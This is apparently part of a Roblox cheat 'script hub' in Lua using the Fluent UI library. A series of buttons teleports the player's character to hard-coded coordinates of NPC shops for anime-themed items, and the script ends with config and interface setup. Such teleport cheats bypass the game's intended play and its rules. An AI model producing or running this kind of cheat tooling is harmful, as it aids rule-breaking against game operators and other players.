NpcShopTP:AddButton({
       Title = "[Random Demon Fruit] [500000 Beli]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(787.530762, 35.5073013, 1200.37122, 0.999804795, -3.53292684e-08, 0.0197579358, 3.5835928e-08, 1, -2.5289447e-08, -0.0197579358, 2.59925539e-08, 0.999804795)
end
   })

NpcShopTP:AddButton({
       Title = "[Gojo (Eye Patch) ] [Require : Infinity Orb] [3500 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1526.62134, 136.759964, -257.611664, 0.050806988, -8.10261902e-09, 0.998708487, -2.63210076e-08, 1, 9.45211731e-09, -0.998708487, -2.6767248e-08, 0.050806988)
end
   })

NpcShopTP:AddButton({
       Title = "[Cid's Sword] [Require : 5 Shadow Orb] [15000 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2086.48389, 77.8514175, 655.046692, 0.999925077, -3.57938346e-09, 0.0122415517, 3.236857e-09, 1, 2.80004535e-08, -0.0122415517, -2.79587322e-08, 0.999925077)
end
   })

NpcShopTP:AddButton({
       Title = "[Remove Demon Fruit from Inventory] [Except : Secret & Mythical]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-678.306702, 40.3787766, -1881.7594, 1, -3.30142953e-08, 2.01401108e-14, 3.30142953e-08, 1, 9.71047385e-08, -2.33459543e-14, -9.71047385e-08, 1)
end
   })

NpcShopTP:AddButton({
       Title = "[Kashimo's Pole V1] [50000000$]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(838.588745, 42.4595222, -1516.1405, 1, 3.96085653e-08, 8.85604493e-07, -3.96084801e-08, 1, -9.72064171e-08, -8.85604493e-07, 9.72063816e-08, 1)
end
   })

NpcShopTP:AddButton({
       Title = "[Kashimo's PoleV2 [Curse]] [Require :  Kashimo's Pole & 10 Lightning Orb] [15000 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(998.657349, 35.5072975, 1237.68372, -7.60766952e-08, -4.58059475e-08, -1, 9.41029032e-09, 1, -4.5805951e-08, 1, -9.41029388e-09, -7.60766952e-08)
end
   })

NpcShopTP:AddButton({
       Title = "[Itadori] [Require : 1 Sukuna Finger] [7500 Gem]",
       Callback = function()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1834.22058, 57.2104073, -2461.83496, -0.847525597, 9.20146661e-08, -0.530754507, 1.22204483e-07, 1, -2.17742162e-08, 0.530754507, -8.3314788e-08, -0.847525597)
end
   })

NpcShopTP:AddButton({
       Title = "[Gon] [Require : Gon's Fishing bait] [2500 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(460.52655, 38.3999062, -3006.6814, -0.00754104555, 1.56928088e-08, 0.999971569, -4.06405078e-08, 1, -1.59997349e-08, -0.999971569, -4.07600069e-08, -0.00754104555)
end
   })

NpcShopTP:AddButton({
       Title = "[GojoV2 [Unleashed] ] [Require : Limitless] [5000 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2448.97192, 64.2299652, -1163.28821, 0.986545622, -1.96925534e-08, 0.163486078, 9.2132002e-10, 1, 1.14894355e-07, -0.163486078, -1.13197906e-07, 0.986545622)
end
   })
 
 NpcShopTP:AddButton({
        Title = "[Uraume] [Require : 5 Cursed Ice Shard] [5000 Gem]",
        Callback = function()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1933.35132, 111.110405, -2177.22241, -0.0343346596, -6.64154527e-08, -0.999410391, -2.09004813e-08, 1, -6.57366002e-08, 0.999410391, 1.86311144e-08, -0.0343346596)
 end
    })
  
  NpcShopTP:AddButton({
         Title = "[Sukuna [Half Power]] [Require : King of Curse's Soul] [5000  Gem]",
         Callback = function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2460.72266, 55.483223, -1446.37256, -0.0169456564, -1.44014569e-08, -0.999856412, -8.8613703e-08, 1, -1.29016922e-08, 0.999856412, 8.83823503e-08, -0.0169456564)
  end
     })




SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- You can add indexes of elements the save manager should ignore
SaveManager:SetIgnoreIndexes({})

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Npc.Settings)
SaveManager:BuildConfigSection(Npc.Settings)


Window:SelectTab(1)

Fluent:Notify({
    Title = "Fluent",
    Content = "The script has been loaded.",
    Duration = 8
})

-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()
